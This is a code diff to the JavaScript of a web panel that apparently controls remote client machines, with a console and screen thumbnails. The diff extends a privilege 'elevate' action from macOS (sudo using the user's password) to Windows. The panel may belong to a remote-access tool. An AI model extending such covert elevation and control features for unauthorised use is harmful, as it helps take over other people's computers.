@@ -253,8 +253,9 @@ function applyMenuSupportRules(clientId) {
 
   const elevateBtn = menu.querySelector('[data-action="elevate"]');
   if (elevateBtn) {
-    elevateBtn.style.display = platform === "mac" ? "" : "none";
-    if (platform === "mac") setAvailability(elevateBtn, isOnline, "Client is offline");
+    const canElevate = platform === "mac" || platform === "windows";
+    elevateBtn.style.display = canElevate ? "" : "none";
+    if (canElevate) setAvailability(elevateBtn, isOnline, "Client is offline");
   }
 
   setAvailability(menu.querySelector('[data-open="console"]'), isOnline, "Client is offline");
@@ -1676,21 +1677,26 @@ menu.addEventListener("click", async (e) => {
   }
 
   if (action === "elevate") {
-    const password = prompt("Enter the user's macOS password for sudo elevation:");
-    if (!password) {
-      closeMenu(clearContext);
-      return;
+    const isMac = detectClientPlatform(contextCard) === "mac";
+    let password = "";
+    if (isMac) {
+      password = prompt("Enter the user's macOS password for sudo elevation:");
+      if (!password) {
+        closeMenu(clearContext);
+        return;
+      }
     }
     try {
+      const payload = { action: "elevate" };
+      if (password) payload.password = password;
       const res = await fetch(`/api/clients/${contextCard}/command`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ action: "elevate", password }),
+        body: JSON.stringify(payload),
       });
       const data = await res.json().catch(() => ({}));
       if (data.ok) {
-        alert(data.message || "Elevation successful — client will reconnect as root.");
-        // Stagger thumbnail requests to catch the client after it reconnects
+        alert(data.message || "Elevation successful — client will reconnect elevated.");
         setTimeout(() => requestThumbnail(contextCard), 5000);
         setTimeout(() => requestThumbnail(contextCard), 10000);
         setTimeout(() => requestThumbnail(contextCard), 18000);
